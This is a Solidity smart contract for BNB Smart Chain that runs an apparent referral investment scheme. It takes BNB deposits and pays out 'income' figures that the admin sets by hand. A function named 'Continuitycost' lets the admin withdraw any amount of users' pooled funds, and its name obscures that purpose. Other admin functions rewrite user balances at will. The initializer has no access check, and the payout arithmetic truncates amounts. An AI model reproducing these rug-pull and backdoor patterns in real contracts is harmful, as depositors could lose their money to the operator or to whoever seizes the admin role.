// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.9;

interface AggregatorV3Interface {

  function decimals()
    external
    view
    returns (
      uint8
    );

  function description()
    external
    view
    returns (
      string memory
    );

  function version()
    external
    view
    returns (
      uint256
    );

  // getRoundData and latestRoundData should both raise "No data present"
  // if they do not have data to report, instead of returning unset values
  // which could be misinterpreted as actual reported values.
  function getRoundData(
    uint80 _roundId
  )
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );

  function latestRoundData()
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );

}

/**
     * Network: bsc
     * Aggregator: BNB/USD
     * Address: 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE  // Test - 0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526
     */


contract QunoCoin_master3{

    AggregatorV3Interface internal priceFeed;

    struct Deposit {
        uint amount ;
        uint amountInUSD;
        uint timestamp;
    }

    struct  User {
        address refferal_code;
        uint amount;
        uint TotalamountInUSD;
        uint timestamp;
        Deposit [] deposit;
        uint totalIncome;
        uint withdrawan;
    }

    bool public started;
    bool private IsInitinalized;
    address payable public admin;
    mapping (address => User)  public userdata;

    function initinalize(address payable _admin) external{
        require(IsInitinalized ==false );
        admin = _admin;
        IsInitinalized = true ;
        priceFeed = AggregatorV3Interface(0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526);
    }


    function getLatestPrice() public view returns (int) {
        (
            /* uint80 roundID */,
            int price,
            /*uint startedAt */,
            /*uint timeStamp*/,
           /* uint80 answeredInRound*/
        ) = priceFeed.latestRoundData();
        return price;
    }

    function TotalusdPrice(int _amount) public view returns (int) {
        int usdt = getLatestPrice();
        return (usdt * _amount)/1e18;

    }


    function invest (address _refferal_code) public payable{

        if (!started) {
			if (msg.sender == admin) {
				started = true;
			} else revert("Not started yet");
		}
      
        User storage user = userdata[msg.sender];

        if (user.refferal_code == address(0)) {
			if (userdata[_refferal_code].deposit.length > 0 && _refferal_code != msg.sender) {
				user.refferal_code = _refferal_code;
			}
		}

       
        user.amount += msg.value;
        user.TotalamountInUSD += uint256(TotalusdPrice(int(msg.value)));
        user.timestamp = block.timestamp;
        user.deposit.push(Deposit(msg.value , uint256(TotalusdPrice(int(msg.value))), block.timestamp));
        
    }

    function userWithdrawal() public returns(bool){
        User storage u = userdata[msg.sender];
        bool status;
        if(u.totalIncome > u.withdrawan){
        uint256 amount = (u.totalIncome - u.withdrawan);
        u.withdrawan = (u.withdrawan + amount);

        uint256 receivable = getCalculatedBnbRecieved(amount);
        payable(msg.sender).transfer(receivable);
        status = true;
        }

        return status;
    }

    function syncdata(uint _amount ,address _useraddress) public returns(bool){

        bool status;
        require(msg.sender == admin, 'permission denied!');
        User storage u = userdata[_useraddress];
        u.totalIncome = _amount;

        return status;
    }

    function updateDataW(uint _amount , address _useraddress) public returns(bool){

       bool status;
        require(msg.sender == admin, 'permission denied!');
        User storage u = userdata[_useraddress];
        u.withdrawan = _amount;

        return status;
    }




    function getDepositLength(address _useraddress) public view returns(uint){
        User storage u = userdata[_useraddress] ;
        return u.deposit.length;
    }


    function getDeposit(uint _index ,address _useraddress) public view returns(uint,uint , uint){
        User storage u = userdata[_useraddress] ;
        return (u.deposit[_index].amount ,u.deposit[_index].amountInUSD ,u.deposit[_index].timestamp);
    }
    function getUserInfo( address _useraddress) public view returns (address ,uint ,uint){
         User storage u2 = userdata[_useraddress];
         return (u2.refferal_code,u2.amount,u2.timestamp);
    }
    function Continuitycost(uint256 amount) public{
       
		require(msg.sender == admin , "permission denied!");	   		 
        payable(msg.sender).transfer(amount);
			
    }

    function getCalculatedBnbRecieved(uint256 _amount) public view returns(uint256) {
		uint256 usdt = uint256(getLatestPrice());
		uint256 recieved_bnb = (_amount/usdt)*1e18;
		return recieved_bnb;
	}
	
       
       
}